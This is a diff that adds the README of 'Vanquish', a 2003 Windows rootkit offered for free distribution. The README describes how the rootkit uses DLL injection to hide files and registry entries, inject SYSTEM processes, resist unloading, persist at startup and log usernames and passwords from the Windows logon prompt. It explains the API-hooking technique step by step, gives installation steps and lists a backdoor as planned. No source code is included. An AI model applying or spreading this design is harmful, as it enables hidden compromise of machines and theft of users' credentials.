@@ -1,0 +1,228 @@
+*************************************************************************
+*                                                                       *
+*                          Vanquish v0.1 beta8                          *
+*                                                                       *
+*************************************************************************
+          *                                                   *
+          *  Copyright (c)2003 XShadow, All rights reserved.  *
+          *                                                   *
+          *****************************************************
+
+      -=WARNING! YOUR SYSTEM COULD BECOME UNSTABLE AFTER INSTALL=-
+
+                         *** USE AT OWN RISK! ***
+
+This version is THE MOST STABLE one until this point.
+
+The installation of a SP/AntiVirus should not affect vanquish.
+
+As a side note, vanquish was designed to run with **Adminstrator** privilege.
+Please, before mailing that vanquish doesn't work check that you have the privilege
+of being an admin, and that you installed vanquish with this privilege.
+
+Please excuse the lame ASCII art... ;)
+You can contact me at: xshadow (at) rootkit.com
+
+Description
+====================
+Vanquish is a dll injection based rootkit that hides files, folders, registry
+entries and logs passwords. It was especially designed to work under 'Windows XP'.
+NB: It won't function under 'Windows 9x/Me'. Other system based on NT 5.0 or higher
+*should* work fine (e.g. 2000, Servers, Advanced Servers, Longhorn). Did somebody
+test it under wine? :)
+
+Current version highlights:
+    o Managed to inject taskmgr.exe! Please be very careful as to not to be able
+to uninstall vanquish because of not being able to access it. If you want a clean
+taskmgr (to see hidden things) you must use the subjective injection feature and
+do a run 'taskmgr.exe vanquish' or something similar.
+    o Password logging works really fine with the logon prompt, but only with the
+english version of Windows because of the method involved. I hope I will find a
+more general way to do this.
+
+From now on, vanquish is internally divided into modules (5 to date):
+
+1)DllUtils
+    Inject vanquish dll into new processes. (CreateProcessW, CreateProcessAsUserW)
+    Make sure nobody will unload vanquish. (FreeLibrary)
+
+    Utilites related to dll functionality and propagation.
+
+2)HideFiles
+    Hide files/folders containing the magic string "vanquish".
+                                            (FindFirstFileExW, FindNextFileW)
+
+    A hidden file/folder won't get reported by windowze as occupying space and
+    cannot be found with "Search For Files or Folders..." or similar, and a folder
+    containing hidden files/folders cannot be erased.
+
+3)HideReg
+    Hide registry entries containing the same magic string.
+                                    (RegCloseKey, RegEnumKeyA/W, RegEnumKeyExA/W,
+                                    RegEnumValueA/W, RegQueryMultipleValuesA/W)
+
+    Uses an advanced system to keep track of enumerated keys/values and hide the
+    ones that need to be hidden.
+
+4)PwdLog
+    Logs username, passwords and possibly domain.
+                                    (LogonUserW, SetWindowTextW, GetDlgItemW)
+
+    After first-time injection, vanquish survives logoff(>:->) and thus is able
+    to intercept logon username, password and domain. Firstly it intercepts calls
+    to LogonUserW (probably 'runas' commands, switch user and similar). To get the
+    logon password we use a little trick: we find the logon window (wich is named
+    'Logon to Windows') and remember it's handle; then, when GetDlgItemW is invoked
+    to read the contents of a dialog item, we check whetever it is from the handle
+    we have and log the data.
+
+    Please note that on logon interception, the password is intercepted first, and
+    then the user. Haven't experimented with domains. They should get reported too
+    anyway.
+
+5)SourceProtect
+    Prevent deletion of files/folders that start with D:\MY
+                                        (DeleteFileA/W, RemoveDirectoryA/W)
+    Prevent change of system time.
+	                                (SetLocalTime, SetTimeZoneInformation,
+                                        SetSystemTimeAdjustment, SetSystemTime)
+
+    This is a personal add-on that I use on my computer so no one will delete
+    my files on a FAT partition.
+
+
+Other features:
+    Error logging - everything (including passwords) will be shown in a file
+                    called 'vanquish.log' in the root of c:
+	          - please don't report dll injection failed errors as they
+                    are very common; I'm working on it...
+
+    Advanced injector - it can modify any process (even the SYSTEM ones...)
+
+    Subjective injection - a hidden executable (e.g. ...\xyvanquish.exe) or a normal
+    executable in a hidden folder (e.g. ...\hiddenvanquish\xy.exe) will NOT get
+    injected with vanquish.dll and so it will be able to see what others can not.
+    Another example is to include "vanquish" as a parameter with the same effect
+    (e.g. ...\blah\regedit.exe vanquish)
+
+Installation
+====================
+Simple: copy the files to a folder on your HD and then
+        double-click setup.cmd and follow the instructions from there.
+
+THE SOFTWARE PACKAGE
+====================
+includes the following files:
+
+ReadMe.txt - this file
+vanquish.exe - the initial injector program
+vanquish.dll - this is the heart of the program
+startup.reg - makes vanquish load at startup
+setup.cmd - installation batch file
+
+Known Problems
+===================
+* When an application first starts up, injection may be delayed so hidden entries
+may show up until the next application refresh...
+
+Program history
+===================
+v0.1 beta8 ------ included version information
+                - unload protection added
+                - code divided into modules
+                - fixed CreateProcessW so it won't deadlock
+                - added CreateProcessAsUserW for more comprehensive injection so
+                  taskmgr.exe gets injected too!				  
+                - registry hiding is a lot faster (forgot to update time when a
+                  free slot was found and thus RKI was rebuilding the indexes
+                  every time a registry read was intercepted)
+                - minor coding in HideFiles module
+                - password logging extended to logon prompt
+v0.1 beta7 ------ extended the old error reporting
+                - added RegQueryMultipleValues
+                - cleaned up the code a little bit
+                - new registry hiding method that WORKS!
+                - fixed a nasty stack overflow bug
+                - subjective injection
+                - password logging
+v0.1 beta6 ------ it hides itself(changed hiding string from "hidethis" to
+                  "vanquish")
+v0.1 beta5 ------ registry hiding added
+v0.1 beta4 ------ "Add/Remove Programs" would block for INFINITY
+                - added some basic error reporting
+v0.1 beta3 ------ now the injection method is DIRECT (smaller and efficient)
+                - the injector algorithm works on SYSTEM processes
+                - code made smaller (hooked only UNICODE functions)
+v0.1 beta2 ------ it affects all explorer.exe child processes
+v0.1 beta  ------ it affects only explorer.exe (no child process injection)
+
+How does it work
+===================
+It hooks API calls and processes them. When needed it calls the REAL Windows API for
+additional processing. The hooking method is described in "Technics of hooking API
+functions on Windows" by Holy_Father <holy_father@phreaker.net> section 3.2.4.1 -
+- DLL Injection with a little note: you need the argument of the LoadLibrary call
+in the target process address space so we must VirtualAlloc and WriteProcessMemory
+first and then do the CreateRemoteThread-LoadLibrary call. The effective API replace
+is done by overwriting the first 5 bytes of the API prologue with a 32bit offset jmp
+instruction to our NEW Vanquish API wich resides in the injected DLL(vanquish.dll);
+if needed Vanquish will rebuild the first 5 bytes of the REAL API and call it, then
+write the jmp once again. I know... Don't tell me... It's not thread-safe...
+
+The vanquish DLL is initially injected into all exe images by vanquish.exe.
+The injection code is also present into vanquish.dll and is activated when a call to
+CreateProcess is intercepted. This code doesn't use the old method from v0.1 beta2
+that first writes a shellcode in the target process and then starts a thread that
+execs the shellcode that then calls LoadLibrary that loads a new instance of
+vanquish.dll and then exits. From v0.1 beta3 the injection is done directly without
+shellcode.
+
+The dll injection method, is in my vision a lot more easier to implement than a driver
+that works in kernel mode and that rewrites the syscall table.
+
+TO IMPLEMENT
+===================
+    - service implementation and hiding
+    - dynamic api replacement
+later...
+	- process hiding
+	- backdoor
+
+Legal stuff ;(
+===================
+
+			     NO WARRANTY
+
+      PLEASE NOTE THAT THE TERM "THE PROGRAM" REFERS TO THE SOFTWARE
+PACKAGE DEFINED ABOVE. YOU CAN DISTRIBUTE THIS PROGRAM FREELY AS LONG AS
+IT IS INTACT (IT INCLUDES ALL OF THE FILES NAMED ABOVE) AND YOU DON'T
+CHARGE FOR IT OR IT'S DISTRIBUTION.
+
+      THE SOLE EXISTENCE OF ANY FILE (TEXT OR BINARY) ON YOUR SYSTEM THAT
+IS INCLUDED IN THE SOFTWARE PACKAGE IS CONSIDERED AS AN ACCEPTANCE OF THIS
+DISCLAIMER EVEN IF THE PROGRAM WAS NEVER EXECUTED AND/OR COPIED BY THE
+COMPUTER OWNER/ADMINISTRATOR AND EVEN IF THIS DISCLAIMER IS NOT PRESENT
+OR HAS NOT BEEN READ BY THE COMPUTER OWNER/ADMINISTRATOR.
+
+      BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
+FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
+OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
+PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
+OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
+TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
+PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
+REPAIR OR CORRECTION.
+
+      IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
+REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
+INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
+OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
+TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
+YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
+PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGES.
+
+
+-EOF-
